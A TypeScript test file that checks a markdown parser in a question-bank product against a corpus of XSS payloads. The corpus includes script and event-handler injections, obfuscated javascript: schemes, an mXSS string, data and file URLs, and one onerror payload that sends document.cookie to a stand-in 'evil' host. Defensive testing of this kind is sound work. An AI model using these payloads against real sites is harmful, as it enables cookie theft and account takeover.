/* This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at https://mozilla.org/MPL/2.0/. */

/**
 * The payload corpus T-038 requires, run against the parser on every build.
 *
 * Each entry is a question prompt an importer could plausibly receive — from a public
 * dataset, a QTI file, or a customer's legacy bank. The assertion is the same for all of
 * them and it is made structurally rather than by looking for `alert(`: after parsing,
 *
 *   1. every node is one of the types the renderer knows how to render, and
 *   2. no `link.href` or `image.src` exists whose scheme is outside the allow list.
 *
 * Those two facts together are the whole security argument. There is no third fact about
 * escaping, because nothing in this pipeline produces markup to escape (ADR-022) — which is
 * also why this suite can be exhaustive about payloads without being a block list: a payload
 * that is not in this corpus meets the same two facts.
 */

import { describe, expect, it } from 'vitest';

import { type Block, type Inline } from './ast.js';
import { parseMarkdown } from './index.js';

const INLINE_TYPES = new Set(['text', 'code', 'strong', 'emphasis', 'link', 'image', 'break']);
const BLOCK_TYPES = new Set(['heading', 'paragraph', 'code', 'list', 'quote', 'rule', 'table']);

interface Walk {
  readonly destinations: string[];
  readonly text: string[];
  readonly types: string[];
}

function walkInline(nodes: readonly Inline[], out: Walk): void {
  for (const node of nodes) {
    out.types.push(node.type);
    switch (node.type) {
      case 'text':
      case 'code':
        out.text.push(node.value);
        break;
      case 'strong':
      case 'emphasis':
        walkInline(node.children, out);
        break;
      case 'link':
        out.destinations.push(node.href);
        walkInline(node.children, out);
        break;
      case 'image':
        out.destinations.push(node.src);
        out.text.push(node.alt);
        break;
      case 'break':
        break;
    }
  }
}

function walkBlocks(blocks: readonly Block[], out: Walk): void {
  for (const block of blocks) {
    out.types.push(block.type);
    switch (block.type) {
      case 'heading':
      case 'paragraph':
        walkInline(block.children, out);
        break;
      case 'code':
        out.text.push(block.value);
        break;
      case 'list':
        for (const item of block.items) walkBlocks(item, out);
        break;
      case 'quote':
        walkBlocks(block.children, out);
        break;
      case 'rule':
        break;
      case 'table':
        for (const cell of block.head) walkInline(cell, out);
        for (const row of block.rows) for (const cell of row) walkInline(cell, out);
        break;
    }
  }
}

function walk(source: string): Walk {
  const out: Walk = { destinations: [], text: [], types: [] };
  walkBlocks(parseMarkdown(source).blocks, out);
  return out;
}

/**
 * The corpus. Grouped by the trick each one plays, because the groups are what a reviewer
 * needs to check for gaps — individual payloads are endless.
 */
const CORPUS: readonly { readonly name: string; readonly source: string }[] = [
  // --- raw HTML, which markdown renderers traditionally pass through --------------
  { name: 'script element', source: '<script>alert(1)</script>' },
  {
    name: 'img onerror',
    source: '<img src=x onerror="fetch(`https://evil/?c=`+document.cookie)">',
  },
  { name: 'svg onload', source: '<svg/onload=alert(1)>' },
  { name: 'iframe with a javascript src', source: '<iframe src=javascript:alert(1)></iframe>' },
  { name: 'details ontoggle', source: '<details open ontoggle=alert(1)>x</details>' },
  { name: 'anchor with a javascript href', source: '<a href="javascript:alert(1)">click</a>' },
  { name: 'style element', source: '<style>body{background:url(javascript:alert(1))}</style>' },
  { name: 'comment-smuggled script', source: '<!--<script>alert(1)</script>-->' },
  {
    name: 'mXSS through a mis-nested foreign element',
    source: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
  },
  { name: 'base tag hijacking relative URLs', source: '<base href="https://evil.example/">' },

  // --- the scheme, which is the only channel left -----------------------------------
  { name: 'javascript link', source: '[click](javascript:alert(1))' },
  { name: 'mixed-case scheme', source: '[click](JaVaScRiPt:alert(1))' },
  { name: 'tab inside the scheme', source: '[click](java\tscript:alert(1))' },
  { name: 'newline inside the scheme', source: '[click](java\nscript:alert(1))' },
  { name: 'decimal entity scheme', source: '[click](&#106;avascript:alert(1))' },
  { name: 'hex entity scheme', source: '[click](&#x6a;avascript:alert(1))' },
  { name: 'entity newline inside the scheme', source: '[click](jav&#x0A;ascript:alert(1))' },
  { name: 'leading whitespace before the scheme', source: '[click](   javascript:alert(1))' },
  { name: 'leading NUL before the scheme', source: '[click](\u0000javascript:alert(1))' },
  { name: 'vbscript', source: '[click](vbscript:msgbox(1))' },
  {
    name: 'data URL image',
    source: '![x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
  },
  { name: 'data URL svg image', source: '![x](data:image/svg+xml,<svg onload=alert(1)>)' },
  { name: 'javascript autolink', source: '<javascript:alert(1)>' },
  { name: 'backslash host', source: '[click](\\\\evil.example/x)' },
  { name: 'file scheme', source: '[click](file:///etc/passwd)' },

  // --- the payload hidden inside another construct ----------------------------------
  { name: 'inside a code span', source: 'Consider `<img src=x onerror=alert(1)>`' },
  { name: 'inside a fence', source: '```html\n<script>alert(1)</script>\n```' },
  {
    name: 'inside a table cell',
    source: '| a | b |\n| - | - |\n| <script>alert(1)</script> | [x](javascript:alert(1)) |',
  },
  {
    name: 'inside a list item',
    source: '- <img src=x onerror=alert(1)>\n- [x](javascript:alert(1))',
  },
  { name: 'inside a blockquote', source: '> <script>alert(1)</script>' },
  { name: 'inside a heading', source: '# <script>alert(1)</script>' },
  {
    name: 'inside image alt text',
    source: '![<script>alert(1)</script>](https://example.com/a.png)',
  },
  { name: 'inside link text', source: '[<img src=x onerror=alert(1)>](https://example.com)' },
];

describe('the XSS corpus (T-038)', () => {
  it.each(CORPUS)('$name produces no unsafe destination', ({ source }) => {
    for (const destination of walk(source).destinations) {
      // The oracle is the platform's own URL parser rather than a regex of our own, and
      // deliberately not the function under test. `new URL` implements the WHATWG rules a
      // browser applies to an `href` — stripping tab, newline and carriage return from
      // anywhere, trimming C0 controls and space from the ends — so this asks the question
      // the browser will ask: after you resolve this against the page, where do you go?
      const resolved = new URL(destination, 'https://console.assaybank.example/questions/1');
      expect(['http:', 'https:', 'mailto:']).toContain(resolved.protocol);
    }
  });

  it.each(CORPUS)('$name produces only node types the renderer knows', ({ source }) => {
    for (const type of walk(source).types) {
      expect(INLINE_TYPES.has(type) || BLOCK_TYPES.has(type)).toBe(true);
    }
  });

  it.each(CORPUS)('$name never yields a node that carries markup as a value', ({ source }) => {
    // The complement of the first two assertions: nothing is smuggled through a field the
    // renderer will trust. Text and code values are rendered as text nodes, so angle
    // brackets in them are displayed, not parsed — this asserts they stay in those fields.
    const { blocks } = parseMarkdown(source);
    const json = JSON.stringify(blocks);
    expect(json).not.toContain('"href":"javascript');
    expect(json).not.toContain('"src":"data:');
  });
});

describe('what the author is told was refused', () => {
  it('names the raw HTML rather than silently deleting it', () => {
    const doc = parseMarkdown('Before\n\n<img src=x onerror=alert(1)>\n\nAfter');

    expect(doc.rawHtml).toHaveLength(1);
    expect(doc.rawHtml[0]?.fragment).toBe('<img src=x onerror=alert(1)>');
    expect(doc.rawHtml[0]?.line).toBe(3);
  });

  it('does not report HTML the author put in a code fence on purpose', () => {
    const doc = parseMarkdown(
      'What does this render as?\n\n```html\n<script>alert(1)</script>\n```',
    );

    expect(doc.rawHtml).toEqual([]);
  });

  it('does not report a code span, an autolink or a comparison', () => {
    expect(parseMarkdown('Use `<section>` here').rawHtml).toEqual([]);
    expect(parseMarkdown('See <https://example.com/docs>').rawHtml).toEqual([]);
    expect(parseMarkdown('Assert that a < b and b > c').rawHtml).toEqual([]);
  });

  it('names the destination it refused, and keeps the words around it', () => {
    const doc = parseMarkdown('Read [the brief](javascript:alert(1)) before starting.');

    expect(doc.rejectedUrls).toEqual([
      { url: 'javascript:alert(1)', reason: 'scheme-not-allowed', label: 'the brief' },
    ]);
    // The sentence survives its link. Deleting the words to remove the link would leave the
    // reader a sentence with a hole in it and no way to know one was there.
    const walked = walk('Read [the brief](javascript:alert(1)) before starting.');
    expect(walked.text.join('')).toContain('Read the brief before starting.');
    expect(walked.destinations).toEqual([]);
  });
});

describe('the safe cases still work', () => {
  it('keeps an https link', () => {
    expect(walk('[docs](https://example.com/a)').destinations).toEqual(['https://example.com/a']);
  });

  it('keeps a relative image, which resolves against our own origin', () => {
    expect(walk('![schema](/assets/schema.png)').destinations).toEqual(['/assets/schema.png']);
  });

  it('keeps a mailto link', () => {
    expect(walk('[ask](mailto:hiring@example.com)').destinations).toEqual([
      'mailto:hiring@example.com',
    ]);
  });
});
